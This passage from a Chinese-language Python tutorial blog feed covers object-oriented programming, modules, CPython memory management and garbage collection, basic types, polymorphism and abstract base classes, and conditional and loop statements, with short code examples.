Myclass(\u0026#34;Python\u0026#34;) a.speak()\t# Python 由于我们在定义__init__()方法时，加入了name参数，所以在初始化实例对象时需要输入一个实参进行初始化。\n__len__() 在定义类时加入__len__()方法，就可以为调用len()方法求取该类的实例化对象的长度。\n1 2 3 4 5 6 class Myclass(): def __len__(self): return 10 a = Myclass() print(len(a)) # 10 像我们之前之所以可以用len()函数求取列表、元组等这些数据结构的对象的长度，也都是因为在这些类中有着__len__()方法，我们可以通过查看Python源码知道的。 Python的类中还有更多的特殊方法：\n__init__ : 构造函数，在生成对象时调用 __del__ : 析构函数，释放对象时使用 __repr__ : 打印，转换 __setitem__ : 按照索引赋值 __getitem__: 按照索引获取值 __len__: 获得长度 __cmp__: 比较运算 __call__: 函数调用 __add__: 加运算 __sub__: 减运算 __mul__: 乘运算 __truediv__: 除运算 __mod__: 求余运算 __pow__: 乘方 4. 封装 封装是面向对象的三大特性之一 在我们之前对函数的学习中，我们可以用装饰器对函数进行封装。在类中，我们也可以对其进行封装。对类中的属性和方法进行封装，可以保证数据的安全，隐藏一些私有方法和属性，降低程序出现问题的风险。\n封装属性 当在类中有一些属性我们不希望在外部知道属性的名字时，可以用下滑线进行隐藏私有属性。 单下划线：\n1 2 3 4 5 6 7 8 class Myclass(): def __init__(self): self._name = \u0026#39;Python\u0026#39; a = Myclass() # 从外面不能看到_name属性 # 但是可以通过_name进行访问 print(a._name) # Python 双下划线：\n1 2 3 4 5 6 7 8 class Myclass(): def __init__(self): self.__name = \u0026#39;Python\u0026#39; a = Myclass() # 不能从外面看到__name属性，也不能通过__name访问 # 但是可以通过_类名__属性名的方法进行访问 print(a._Myclass__name) # Python 从上面的讲解可以发现，封装并不是绝对的，仍然是可以访问的，只是要麻烦一点。这个麻烦是为了告诉外部调用者该属性为类的私有属性，不要擅自修改。\n封装方法 限制访问： 可以通过下划线的方式将属性进行封装。\n1 2 3 4 5 6 7 8 class Myclass(): def __run(self): print(\u0026#39;Python\u0026#39;) a = Myclass() # 无法从外部看到run()方法 # 但是可以通过_类名__方法名的方法进行调用 a._Myclass__run() # Python 封装成属性： 在类中可以利用@property装饰器将一个方法转化为属性，我们可以像调用属性一样调用该方法。\n1 2 3 4 5 6 7 8 class Myclass(): @property def run(self): print(\u0026#39;Python\u0026#39;) a = Myclass() # 在没有用装饰器之前，我们必须要通过a.run()来调方法 a.run # Python @property的妙用 当我们想让外部使用者对类中私有属性拥有一定权限时，我们可以通过装饰器来实现。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 class Person: def __init__(self): self._name = \u0026#39;Python\u0026#39; # 读取私有属性 def name(self): return self._name # 修改私有属性 def set_name(self,value): self._name = value # 删除私有属性 def del_name(self): del self._name a = Person() print(a.name()) # Python a.set_name(\u0026#39;Java\u0026#39;) print(a.name()) # Java a.del_name() 通过上面在类中使用的装饰器，我们就实现了对一个私有属性的读取、修改和删除。但是我们通过外部使用时是调用的方法，给人一种不是直接修改属性的感觉。这个时候我们就可以使用property装饰器进行神奇的修改了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 class Person: def __init__(self): self._name = \u0026#39;Python\u0026#39; # 读取私有属性 @property def name(self): return self._name # 修改私有属性 @name.setter def name(self,value): self._name = value # 删除私有属性 @name.deleter def name(self): del self._name a = Person() print(a.name) # \u0026#39;Python\u0026#39; a.name = \u0026#39;Java\u0026#39; print(a.name) #Java del a.name 通过property装饰器我们就实现了对私有属性的权限的修改，保证了内部属性的安全，并且调用时更加美观。\n4. 继承 继承是面向对象的三大特性之一 继承可以提高代码的复用性，让类与类之间产生关系。 像上面这个动物分类一样，一条鱼它既属于鱼类，也属于脊椎动物，还属于动物，那么一条鱼它就既有鱼类的特征，也有脊椎动物和动物的特征，它拥有脊椎动物和动物特征的这个现象就叫做继承。\n单一继承 1 2 3 4 5 6 7 8 9 10 11 12 class Animal(): def animal(self): print(\u0026#34;This is an animal.\u0026#34;) # 在括号中传入类名，传入的类就作为父类 class Fish(Animal): def fish(self): print(\u0026#34;This is an fish.\u0026#34;) a = Fish() a.fish() # This is an fish. a.animal() # This is an animal. 在上面的代码中，Animal是Fish的父类，Fish的实例a不仅仅拥有Fish类中的方法也有着Animal类中的方法。继承了父类，那么就会拥有父类的所有方法与属性。 当我们调用实例化对象的属性和方法时，会先从之间继承的子类中寻找，如果没有，再从其子类继承的父类中寻找。\n1 2 3 4 5 6 7 8 9 10 class A(object): def test(self): print(\u0026#39;A\u0026#39;) class B(A): def test(self): print(\u0026#39;B\u0026#39;) a = B() a.test() # B 在上面的代码中，子类A和父类B中都有着相同的方法tset()，对象在调用方法时，因为会先找子类中的方法，所以代码输出就为\u0026quot;B\u0026quot;。 在创建类的时候省略父类,则默认父类是object，object是所有类的父类，所有类都继承object\n多重继承 在Python我们还可以进行多重继承。有几个父类就在括号中写几个类名就行，这就是实现多重继承的方法。如果多个父类中有同名的方法，则会在第一个父类中寻找，然后找第二个。 在实际开发中没有特殊情况，我们一般避免使用多重继承，因为多重继承会让我们代码过于复杂，不易读懂，容易在实际使用中出现故障。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class A(object): def test(self): print(\u0026#39;A\u0026#39;) class B(): def test(self): print(\u0026#39;B\u0026#39;) class C(A,B): def speak(self): print(\u0026#39;I am C.\u0026#39;) a = C() # I am C. a.test() # A # 可以通过类名.__bases__获取当前类的所有父类 print(A.__bases__) # (\u0026lt;class \u0026#39;__main__.A\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;__main__.B\u0026#39;\u0026gt;) 方法重写 在上面中我们讲到，在调用方法时，会先在子类中寻找，找不到才会去父类中寻找，包括特殊方法。当我们不希望调用父类的某种方法时，我们就可以在子类中重新写该方法，来覆盖父类中的方法。\nsuper()方法 当我们定义一个子类时，希望可以直接调用父类的__init__来初始化父类中的属性，但是在子类中又需要使用__init__方法，直接书写又会覆盖父类的方法。这个时候我们就需要用到super()方法了。 super()可以用来获取当前类的父类，并且通过super()返回的对象调用父类方法时不需要传递self。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Animal(object): def __init__(self): self.name1 = \u0026#39;animal\u0026#39; class Fish(Animal): def __init__(self): self.name2 = \u0026#39;fish\u0026#39; super().__init__() def speak(self): print(\u0026#34;This\u0026#39;s a \u0026#34;,self.name2,\u0026#34;and an\u0026#34;,self.name1) a = Fish() a.speak() # This\u0026#39;s a fish and a animal 多态 多态是面向对象的三大特征之一 在自然界中，鱼类有着许多种类，金鱼、鲤鱼、鲫鱼等等，但是他们都属于同一个类别——鱼类。像父类有多种子类的情况就叫做多态。 通过以上关系不难发现继承是多态的基础，有了继承才能实现多态。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class A(): def __init__(self): self.name = \u0026#39;A\u0026#39; class B(): def __init__(self): self.name = \u0026#39;B\u0026#39; def speak(obj): if isinstance(obj, object): print(obj.name) a = A() speak(a) # A b = B() speak(b) # B 在上面的代码中，虽然a和b是两个不同类的对象，但是因为它们都是属于object类，所以它们都可以成功被speak()函数使用，这里就体现出其多态特性。\n类与实例 类属性：直接在类中定义的属性就是类属性，类属性可以通过类或类的实例访问到，它只能通过类对象来修改，无法通过实例对象来修改。 类方法：类方法的第一个参数是cls，会被Python自动传递，cls就是当前的类对象，类方法可以通过类去调用，也可以通过实例调用。 实例属性：通过实例对象添加的属性属于实例属性，实例属性只能通过实例属性来访问和修改，类对象无法访问和修改。 实例方法：在类中定义的，以self为第一个参数的方法都是实例方法，实例方法在调用时，Python会自动将调用对象作为self传入。通过类对象调用时，不会自动传self,必须手动传self。 静态方法：静态方法基本上是一个和当前类无关的方法，它只是一个保存到当前类中的函数。静态方法一般都是些工具方法，和当前类无关，无法传递类属性或者实例属性，调用它时和普通函数使用方式一样。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 class Myclass(object): # 类属性 name = \u0026#39;cls\u0026#39; def __init__(self, value): # 实例属性 self.value = value # 实例方法 def test1(self): print(self.value) # 类方法 @classmethod def tset2(cls): print(cls.name) # 静态方法 @staticmethod def test3(str1): print(str1, \u0026#39;World!\u0026#39;) a = Myclass(\u0026#39;good\u0026#39;) a.name = \u0026#39;self\u0026#39; print(a.value) # good print(a.name, \u0026#39; || \u0026#39;, Myclass.name) # self || cls a.test1() # good Myclass.test1(a) # good a.tset2() # cls Myclass.tset2() # cls a.test3(\u0026#39;Hello\u0026#39;) # Hello World! Myclass.test3(\u0026#39;Hello\u0026#39;) # Hello World! 关于面向对象的知识大概就是以上这些了，大家可以多多看看那些大牛写的Python代码，那里面使用面向对象知识点的地方很多，看别人写的代码也是一种学习哦！\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/","title":"Python学习之路——面向对象入门"},{"content":"Python 学习之路——模块 Python作为当今一种十分流行地语言，在许多方面都有着涉及，而支撑Python能够这么强大的就是许许多多的开源库。 每一个库也是一个模块，我们在设计程序时也要尽量将程序模块化。程序模块化后在后面的程序开发中就可以通过组合模块来搭建完整程序，避免重复造轮子的现象。 模块化的优点：\n1.方便开发 2.方便维护 3.提高代码复用率 一、导入模块 在Python中利用import函数导入模块。 语法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # 一、导入整个模块 improt 模块名 调用：模块名.功能名 # 二、导入模块并重新起一个名字 import 模块名 as 别名 调用：别名.功能名 # 三、导入模块中的部分功能 from 模块名 import 功能名 调用：功能名 # 四、导入模块中的部分功能并重新起一个名字 from 模块名 import 功能名 as 别名 调用：别名 # 导入整个模块到命名空间，调用时无需加模块名 from 模块名 import * 调用：功能名 注意，最后一种模块导入方式会将模块整个导入命名空间，当模块较大时不建议用此方式。并且在实际使用过程中不建议多个模块使用该方法 导入，因为容易导致变量名的混淆覆盖，导致程序出现异常。\n二、自定义模块 在Python中每一个py文件就是一个模块，我们写的Python文件可以作为模块导入我们到我们的程序中。 每一个程序中有一个__name__特殊方法，可以通过它获得模块的名字，其中__name__属性为__main__的模块就是主模块，在一个Python程序中只有一个主模块，Python执行的也是主模块下的程序。 为了让我们的程序不仅能够作为模块导入功能使用，也能够单独使用，我们常常使用下面格式编写主程序。\n1 2 if __name__ == \u0026#39;__main__\u0026#39;: 主程序块 使用上述代码编写的程序，在作为模块被导入时就不会执行主程序块的内容；在作为主程序使用时执行主程序块的内容。 test1.py程序：\n1 2 3 4 5 def speak(): print(\u0026#39;1:Python\u0026#39;) if \u0026#39;__name__\u0026#39; == \u0026#39;__main__\u0026#39;: speak() # Python test2.py程序：\n1 2 3 4 def speak(): print(\u0026#39;2:Python\u0026#39;) speak() # Python 使用test.py的程序：\n1 2 3 4 5 6 7 8 9 import test1 import test2 test1.speak() # 1:Python test2.speak() # 2:Python # 2:Python 执行上面的程序时我们发现，调用test1模块时，只执行了一次speak()函数，但是调用test2模块时，执行了两次speak()函数，这是因为在调用test2时也执行了speak()。因此在我们平时的程序设计过程中建议使用test1中的模式进行设计程序。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E6%A8%A1%E5%9D%97/","title":"Python学习之路——模块"},{"content":"Python 学习之路——内存管理 一、垃圾回收机制（Garbage Collection） 试想一下，在Python程序中，假如我们每创建一个对象，解释器就为对象开辟一块内存空间。当我们的程序中对象较多时会发生怎样的情景呢？ 显而易见的，当程序中的对象数量较多时，程序运行会占用大量的内存空间，很容易发生内存泄漏的问题。 为了避免这种问题，在Python语言中就需要引入垃圾回收的机制。\n一般对象 1. 引用计数法（Reference Counting） 在 CPython 中，在Python中的每一个对象都是由下面这种结构体封装的。\n1 2 3 4 5 6 7 typedef struct_object { int ob_refcnt; struct_typeobject *ob_type; } PyObject; 在结构体内部有一个ob_refcnt，它负责记录对象的引用次数。初始创建时计数为 1 ，每被其它对象引用一次就加一，结束引用就减一。当计数为零时触发垃圾回收机制，该对象就会从内存中删除，并释放该对象的占用空间。\n1 2 3 4 5 6 7 8 9 class Demo(object): pass a = Demo() print(\u0026#39;a -\u0026gt;\u0026#39;, sys.getrefcount(a)) # 2 b = a print(\u0026#39;a -\u0026gt;\u0026#39;, sys.getrefcount(a)) # 3 del b print(\u0026#39;a -\u0026gt;\u0026#39;, sys.getrefcount(a)) # 2 在上面的代码中，当刚刚生成 a 对象时，计数为1；将 a 传入**sys.getrefcount()**方法中，由于调用了 a 一次，故引用次数为 2 ，在其调用结束后又变成 1 ；将 a 赋值给 b 后 a 的引用次数加 1，故第二次打印为 3 ；当删除了 b 后，a 的引用次数减 1，故第三次打印结果为 2。\n优点： 高效、实现逻辑简单、具备实时性，一旦对象的引用计数归零，就直接释放内存，不需要像其他机制等到特定时机。\n缺点： 每个对象都需要分配单独的空间来统计引用计数，这将会浪费一部分的内存空间。引用计数还有一个致命问题就是无法解决循环引用的垃圾回收：\n1 2 3 4 5 6 a = [] b = [] a.append(b) b.append(a) del a #A的引用减 1，最后A对象的引用为 1 del b #B的引用减 1, 最后B对象的引用为 1 像这样两个对象之间相互引用，且没有被其它对象引用也没有引用其它对象，这两个按理来说是应该被回收的。但是由于相互引用，导致其引用计数不能为 0，因此也无法被回收内存。 大家可能会觉得这个循环引用很容易发现，只需要手动避免就行。但是当我们的程序复杂了之后，多个变量之间就很有可能构成引用环，也会导致其无法回收内存。 为了解决循环引用的问题，Python就需要引入其它的垃圾回收机制。\n2. 标记-清除法（Mark—Sweep） 标记-清除法是一种基于追踪回收技术的垃圾回收算法。它主要分为两个阶段： 第一阶段是标记阶段，GC会把所有的仍在活动的对象——活动对象，打上标记； 第二阶段是回收阶段，GC把那些没有标记的对象——非活动对象，进行回收。 那么GC又是如何判断哪些是活动对象哪些又是非活动对象的呢？ 相互引用的对象之间构成一张有向图。从根对象（root object）出发，能够到达的对象就是活动对象，不能到达的就是非活动对象。\n在上面的有向图中，从黑点（根节点）出发，1、2、3对象都可以到达，因此都会被打上标记，不会被GC回收；而4和5不能到达，因此无法被标记，在回收阶段会被GC回收。 标记清除算法主要处理的是一些容器对象，例如list、dict、tuple等，因为字符串和数值对象是不可能造成循环引用问题。\n缺点： 标记-清除法在清除非活动的对象前它必须顺序扫描整个堆内存，哪怕只剩下小部分活动对象也要扫描所有对象。\n3. 分代回收法 分代回收法代回收是一种以空间换时间的操作方式，Python解释器根据对象的存活时间划分出三个集合，分别为分别为年轻代（第0代）、中年代（第1代）、老年代（第2代），他们对应的是3个链表，它们的垃圾收集频率与对象的存活时间成反比。 新创建的对象都分配在第0代，第0代的总数达到上限时，GC就会把那些可以被回收的对象回收掉，而那些不会回收的对象就会被移到第1代去； 依此类推，老年代中的对象是存活时间最久的对象，甚至是存活于整个系统的生命周期内。 值得注意的是当某一世代的垃圾回收被触发的时候，比该世代年轻的世代也会被扫描。也就是说如果第2代的垃圾回收被触发了，那么第0代、第1代也将被扫描；如果第1代的垃圾回收被触发，第0代也会被扫描；但当第0代触发垃圾回收时，第1代和第2代不会触发垃圾回收。 分代回收是建立在标记清除技术基础之上。分代回收同样处理的是那些容器对象。\n整数 1. 小整数对象池 Python为了优化速度， 避免为整数频繁申请和销毁内存空间，对于在[-5, 257)这个区间内的整数使用小整数对象池，这些整数对象是提前建立好的。 在一个 Python 的程序中，所有位于这个范围内的整数使用的都是同一个对象，不会被垃圾回收。 2. 大整数对象 在Python中，对于每一个大整数，解释器都会创建一个新的对象。 字符串 1. 字符串驻留 Incomputer science, string interning is a method of storing only onecopy of each distinct string value, which must be immutable. Interning strings makes some stringprocessing tasks more time- or space-efficient at the cost of requiring moretime when the string is created or interned. The distinct values are stored ina string intern pool. ————————————————–维基百科\n字符串驻留简单来说，就是值同样的字符串对象仅仅会保存一个，是共用的，这也决定了字符串必须是不可变对象。\n2. Python中的intern机制 1 2 3 4 5 6 \u0026gt;\u0026gt;\u0026gt; a = \u0026#39;Python\u0026#39; \u0026gt;\u0026gt;\u0026gt; b = \u0026#39;Python\u0026#39; \u0026gt;\u0026gt;\u0026gt; id(a) 2629043704112 \u0026gt;\u0026gt;\u0026gt; id(b) 2629043704112 可以发现在Python中字符串对象和小整数对象是及其相似的。 这也就是为什么我们建议在拼接字符串的时候不建议用**+而是用join()**内置方法。 join()是先计算出全部字符串的长度，然后再一一拷贝，仅仅创建一次对象；但当用操作符+连接字符串的时候，每执行一次 + 都会申请一块新的内存，会涉及好几次内存申请和复制。 但是当字符串中含有空格时又是另外一种场景：\n1 2 3 4 5 6 \u0026gt;\u0026gt;\u0026gt; a = \u0026#39;Python \u0026#39; \u0026gt;\u0026gt;\u0026gt; b = \u0026#39;Python \u0026#39; \u0026gt;\u0026gt;\u0026gt; id(a) 2629053106032 \u0026gt;\u0026gt;\u0026gt; id(b) 2629053106096 可以发现，当字符串中有空格时，就没有触发intern机制，那么这是为什么呢？ 通过观察CPython的源码可以得到我们的答案。在CPython源代码 StringObject.h 中可以看到对字符串的注释：\n1 /* … … This is generally restricted tostrings that “looklike” Python identifiers, although the intern() builtincan be used to force interning of any string … … */ 在Python中的intern机制仅仅对那些看起来像是Python标识符的字符串对象才会触发。\n二、使用__solts__ 正常情况下，当我们定义了一个类，并创建了一个类的实例后，我们可以给该实例绑定任何属性和方法，这就是动态语言的灵活性。 但当我们想要限制实例能够绑定的属性时，我们就可以使用 __solts__ 。 __slots__在python中是扮演属性声明（Attribute Declaration）的角色，只有在 __slots__ 里的属性才能够被绑定，没有在 __slots__ 里的实例属性就不能添加，这就大大减少了实例的占用空间。 在Python的每一个实例对象中，都有一个 __dict__ 属性，这个属性总是会占据较大的内存空间。当我们需要节省内存时就可以采取 __solts__ 方法去掉 __dict__ 属性，从而节省我们的内存空间。\n1 2 3 4 5 6 7 8 9 10 11 class abc(object): __slots__ = [\u0026#39;name\u0026#39;] def __init__(self): self.name = \u0026#39;Python\u0026#39; a = abc() a.age = \u0026#39;18\u0026#39; \u0026#39;\u0026#39;\u0026#39; AttributeError: \u0026#39;abc\u0026#39; object has no attribute \u0026#39;age\u0026#39; \u0026#39;\u0026#39;\u0026#39; 由于name属性在__solts__中，但age属性没有在 __solts__中，因此添加 age 属性时会抛出 AttributeError 类型的异常。\n三、弱引用 在Python中，引用对象时只引用对象而不增加引用次数的引用方式我们称为弱引用。弱引用对象随时会被Python的GC机制回收。 弱引用在需要用到循环引用时有着极高的价值。 我们可以通过调用weakref模块的 **ref(obj[ , callback] )**来创建一个弱引用，obj是你想弱引用的对象，callback是一个可选的回调函数【回调函数callback要求单个参数】。\n1 2 3 4 5 6 7 8 9 10 import weakref class A(): pass a = A() print(sys.getrefcount(a)) # 2 b = weakref.ref(a) print(sys.getrefcount(a)) # 2 由于 b 对象是 a 的弱引用对象，因此 a 对象的引用次数不会增加。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/","title":"Python学习之路——内存管理"},{"content":"Python 学习之路——入门知识 一、程序基本概念 1.表达式 表达式指的是由数字、计算符、数字分组符（括号）、自由变量和约束变量等以能求得数值的有意义排列方法所得的组合。\n2.语句 语句指的是一个语法上自成体系的单位，它由一个词或句法上有关连的一组词构成。\n3.变量 当数据不确定的时候，需要对数据进行存储时，就定义一个变量来完成存储动作 变量是计算机内存中的一块区域，存储规定范围内的值。值是可以改变，通俗的说变量就是给数据起个名字，变量名也要符合标识符的命名规则。 每一个变量都是由类型，内存地址和值所组成的。\n1 2 3 a = 10 print(type(a),id(a),a) #\u0026lt;class \u0026#39;int\u0026#39;\u0026gt; 140735734404416 10 4.程序 程序就是完成某个事情的过程中需要完成的步骤，在计算机程序中程序就是由一条一条的语句和表达式构成。\n5.函数 将程序所想要实现的功能进行分割，然后进行封装，当后面的程序需要使用相同功能时不用再重复编写相同的程序，这就叫函数。\n二、标识符 1.关键字 关键字指的是在开发时已经被开发者使用的单词组合，使用者进行使用时不能再使用这些已经被使用的关键字。 查看Python关键字：\n1 2 3 4 5 6 import keyword print(keyword.kwlist) #[\u0026#39;False\u0026#39;, \u0026#39;None\u0026#39;, \u0026#39;True\u0026#39;, \u0026#39;and\u0026#39;, \u0026#39;as\u0026#39;, \u0026#39;assert\u0026#39;, #\u0026#39;async\u0026#39;, \u0026#39;await\u0026#39;, \u0026#39;break\u0026#39;, \u0026#39;class\u0026#39;, \u0026#39;continue\u0026#39;, \u0026#39;def\u0026#39;, #\u0026#39;del\u0026#39;, \u0026#39;elif\u0026#39;, \u0026#39;else\u0026#39;, \u0026#39;except\u0026#39;, \u0026#39;finally\u0026#39;, \u0026#39;for\u0026#39;, #\u0026#39;from\u0026#39;, \u0026#39;global\u0026#39;, \u0026#39;if\u0026#39;, \u0026#39;import\u0026#39;, \u0026#39;in\u0026#39;, \u0026#39;is\u0026#39;, \u0026#39;lambda\u0026#39;, #\u0026#39;nonlocal\u0026#39;, \u0026#39;not\u0026#39;, \u0026#39;or\u0026#39;, \u0026#39;pass\u0026#39;, \u0026#39;raise\u0026#39;, \u0026#39;return\u0026#39;, #\u0026#39;try\u0026#39;, \u0026#39;while\u0026#39;, \u0026#39;with\u0026#39;, \u0026#39;yield\u0026#39;] 2.标识符 定义：标识符是开发人员在程序中自定义的一些符合的名称 例如：变量名、类名、函数名等 命名规则：标识符是由字符（AZ 和 az）、下划线和数字组成，但第一个字符不能是数字；标识符不能和 Python 中的关键字相同；Python中的标识符中，不能包含空格、@、% 以及 $ 等特殊字符。 命名方法： 1）小驼峰命名法：以第一个单词以小写字母开始，第二个单词首字母。例：myName； 2）大驼峰命名法：每一个单词的首字母都采用大写。例：MyName； 3）下划线命名法：用下划线来链接两个有含义的单词。例：my_name。 小结：不管采用怎样的命名方法，在进行标识符进行命名时都应该做到见名知意。如果命名过于随意，对于这种动态型语言，在后期程序的维护中会产生很大的困难，培养一个良好的命名习惯会让你后期写代码更加得心应手\n三、基本数据类型 1.整数类型 int包含多种数字类型：整型int、长整型、浮点数float、复数complex、布尔型bool。 1）直接赋予变量整数值 2）使用构造器 int() 创建 int 类型实例 可选参数 base 表示参数值所属进制，默认为 10，范围[0-36]。\n1 2 3 4 5 6 a = int(\u0026#39;11\u0026#39;,base=10) b = int(\u0026#39;11\u0026#39;,base=2) c = int(\u0026#39;11\u0026#39;,base=8) d = int(\u0026#39;11\u0026#39;,base=16) print(a,b,c,d) # 11,3,9,17 2.浮点型 数学中常用的小数便是小数。在Python程序中，有浮点型数据参与的运算，运算结果都是浮点型的。 创建 float 值有两种方式： 1）直接赋予变量带有小数点的数值 2）使用构造器 float() 创建 float 类型实例 使用 float() 构造器还可以定义无穷。\n1 a = float(\u0026#39;inf\u0026#39;) 3.布尔值 布尔值包含True和False。 布尔类型通常用来做逻辑判断（布尔值实际上也属性整型,True = 1，False = 0）。 创建 bool值有两种方式： 1）直接赋予变量布尔值 2）使用构造器 bool（）创建。 在bool（）中如果输入为空字符串、 0或者None，得到 False；否则，得到 True。\n1 2 3 4 5 6 bool(1) # True bool(10) # True bool() # False bool(0) # False bool(\u0026#39;\u0026#39;) # False bool(None) # False 4.None值 None是一个对象，其类型为NoneType。 None和False不同，它不是0，也不是空字符串 None和任何其他的数据类型比较永远返回False。 可以将None复制给任何变量，但是不能创建其他NoneType对象。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%85%A5%E9%97%A8%E7%9F%A5%E8%AF%86/","title":"Python学习之路——入门知识"},{"content":"Python 学习之路——深入学习多态 一、多态 定义： 多态指同一种事物有着多种状态。\n在Python中多态指不同类型的实例有相同的调用方法。\n实现： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Base(): def say(self): print(\u0026#39;I am a animal.\u0026#39;) class Dog(Base): pass class Cat(Base): pass dog = Dog() cat = Cat() dog.say() cat.say() 在上面的程序中，定义了一个 Base类，在该类中实现了一个 say() 方法，Cat类和Dog类 都继承自Base类，同时也继承了say() 方法。故都可以调用say方法。 虽然 Cat类和Dog类 是不同的类，但都是 Base类 的子类。Base类有着多种状态，这就是多态。\n二、鸭子类型 定义： When I see a bird that walks like a duck and swims like a duck and quacks like a duck, I call that bird a duck.\n鸭子类型的定义来自美国诗人詹姆斯·惠特科姆·莱利的诗句，它的中文翻译：\n当看到一只鸟走起来像鸭子、游泳起来像鸭子、叫起来也像鸭子，那么这只鸟就可以被称为鸭子。\n\u0026ldquo;鸭子类型\u0026quot;像多态一样工作，但是没有继承。 也就是说，它不关注对象的类型，而是关注对象具有的行为(方法)。\n实现： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class Dog(object): def say(self): print(\u0026#34;i am Dog\u0026#34;) class Duck(object): def say(self): print(\u0026#34;i am Duck\u0026#34;) animal = [] dog = Dog() animal.append(dog) duck = Duck() animal.append(duck) for i in animal: i.say() 在程序中，Duck类和Dog类 都定义了 say() 方法，因此可以认为是相同的类，因此可以将两个的实例对象添加到 animal 列表中，通过 for循环 调用 say() 方法。\n三、抽象基类 定义： 抽象类（abstract baseclass,ABC）是指在类中定义了纯虚成员函数的类。纯虚函数一般只提供了接口，并不会做具体实现，实现由它的派生类去重写。 抽象类不能被实例化（不能创建对象），通常是作为基类供子类继承，子类中重写虚函数，实现具体的接口。\n简言之，抽象基类是不能用以实例化的，抽象基类存在的意义就是为了让另一个子类来继承的。继承了抽象基类的子类必须重写抽象基类中实现的虚函数。\n实现： 在Python语言中，通过继承官方库 abc 来实现抽象基类。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import abc class Base(metaclass=abc.ABCMeta): @abc.abstractmethod def say(self): pass class Dog(Base): def say(self): print(\u0026#39;I am a dog.\u0026#39;) class Cat(Base): def say(self): print(\u0026#39;I am a cat.\u0026#39;) animal = [] dog = Dog() animal.append(dog) cat = Cat() animal.append(cat) for i in animal: i.say() \u0026#39;\u0026#39;\u0026#39; I am a dog. I am a cat.B \u0026#39;\u0026#39;\u0026#39; 在上面的程序中，我们定义了一个抽象基类 Base类 ，并在这个类中定义了一个虚函数 say() 函数，通过代码可以看出在这个类中 say() 函数并没有实现任何功能，这也就是叫虚函数的原因。 Cat类和Dog类 都继承了抽象基类 Base类 ，因此需要重写该类里的虚函数 say() 。正因为都重写了 say() 函数，因此才能都添加到 animal 这个列表里，并通过 for 循环进行调用 say() 函数。\n四、isinstance和type的区别 isinstance函数 是用来判断实例对象所属类型的； type函数 可以直接返回实例对象的类型。 那么这两个直接又有什么区别呢？\n1 2 3 4 5 6 7 8 9 10 11 12 class A: pass class B(A): pass b = B() print(isinstance(b, B)) # True print(isinstance(b, A)) # True print(type(b) is B) # True print(type(b) is A) # False 从上面代码执行的结果中我们可以发现 isinstance函数 是考虑了类的继承关系的，但是用 type函数 进行判断时，type函数只返回对象实例的类，而不会考虑继承关系。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%A4%9A%E6%80%81/","title":"Python学习之路——深入学习多态"},{"content":"Python 学习之路——条件控制语句 一、if语句 语法格式： if 条件判别式1： 代码块1 elif 条件判别式2： 代码块2 ... else: 代码块n 执行流程： if-else语句执行时先对条件判别式1进行判断，当条件判别式1为True时执行代码块1，为False时判断条件判别式2，依次类推。当所有的条件判别式都为False时执行else后面的语句。 注：整个if-else语句中，只会执行一条语句。\n二、while语句 语法格式： while 条件判别式： 代码块1 else： 代码块2 执行流程： 执行while语句时，首先对条件判别式进行判断，当判别为True时，执行代码块1的程序，代码块1执行完后再次对条件判别式进行判断，直到条件判别式为False时结束循环并执行else后的代码块。如果循环不是正常结束，例如在代码块中遇到了break语句，那么else后的语句依然不会执行。 注：while-else语句的语法一般在寻找某个元素时使用，如果未找到元素则执行else后的语句，不需要再设置标志变量进行判断。\n三、循环控制语句 循环控制语句包含有break语句和continue语句，循环控制语句可用来控制for循环和while循环。 break：结束整个循环 continue：结束本次循环\n四、优化程序 当我们的程序数据量十分多时，我们就必须要考虑程序的优化问题了，我们下面通过解决下面这个问题来体会优化的重要性： 求100000以内所有的质数 （为了以具体数据来体现程序优化后的效果，我们引入Python标准time库来计算程序运行时间）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # 优化之前： import time start = time.time() i = 2 while i \u0026lt;= 100000: flag = True j = 2 while j \u0026lt; i: if i % j == 0: flag = False break j += 1 if flag: print(i) i += 1 end = time.time() print(\u0026#34;花费%s秒\u0026#34;%(end - start)) 在上面这个程序中我们按照最直接的思路进行书写，我进行测试时是用了70秒左右的时间。下一步我们根据数字的性质，对程序进行优化处理：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # 优化之后： import time start = time.time() i = 2 while i \u0026lt;= 100000: flag = True j = 2 while j \u0026lt;= i**0.5: #对数字进行开平方处理 if i % j == 0: flag = False break j += 1 if flag: print(i) i += 1 end = time.time() print(\u0026#34;花费%s秒\u0026#34;%(end - start)) 